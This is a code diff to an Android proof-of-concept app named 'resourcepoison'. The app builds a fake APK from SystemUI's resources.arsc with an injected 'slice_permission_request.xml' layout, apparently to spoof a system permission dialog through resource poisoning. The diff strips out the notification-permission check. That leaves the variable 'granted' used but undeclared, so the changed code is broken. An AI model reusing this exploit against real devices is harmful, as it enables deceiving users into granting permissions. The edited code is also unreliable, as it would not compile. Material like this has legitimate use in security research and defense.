@@ -1,5 +1,6 @@
 package com.example.resourcepoison;
 
+import java.io.ByteArrayOutputStream;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
@@ -48,15 +49,11 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
-        boolean granted = checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED;
+
         mStartButton.setText(granted ? R.string.start_button : R.string.request_permission);
     }
 
     public void doStartStuff(View view) throws Exception {
-        if (checkSelfPermission(Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
-            requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS}, 1);
-            return;
-        }
         doStartStuff();
     }
 
@@ -71,10 +68,10 @@ public class MainActivity extends Activity {
         PackageInstaller.Session session = packageInstaller.openSession(sessionId);
         try (ZipOutputStream outputStream = new ZipOutputStream(session.openWrite("fake.apk", 0, -1))) {
             try (ZipFile zipFile = new ZipFile(getPackageManager().getApplicationInfo("com.android.systemui", 0).sourceDir); InputStream inputStream = zipFile.getInputStream(zipFile.getEntry("resources.arsc"))) {
-                writeZipEntry(outputStream, "resources.arsc", inputStream.readAllBytes());
+                writeZipEntry(outputStream, "resources.arsc", readAll(inputStream));
             }
             try (InputStream inputStream = getResources().openRawResource(R.layout.injected_layout)) {
-                writeZipEntry(outputStream, "res/layout/slice_permission_request.xml", inputStream.readAllBytes());
+                writeZipEntry(outputStream, "res/layout/slice_permission_request.xml", readAll(inputStream));
             }
         } catch (IOException e) {
             throw new RuntimeException(e);
@@ -139,6 +136,16 @@ public class MainActivity extends Activity {
 
         log("Posting notification (this step will take some time)");
         nm.notify(1, n);
+    }
+
+    static byte[] readAll(InputStream in) throws IOException {
+        ByteArrayOutputStream out = new ByteArrayOutputStream();
+        byte[] buf = new byte[8192];
+        int n;
+        while ((n = in.read(buf)) > 0) {
+            out.write(buf, 0, n);
+        }
+        return out.toByteArray();
     }
 
     void writeZipEntry(ZipOutputStream zipOutputStream, String fileName, byte[] data) throws IOException {
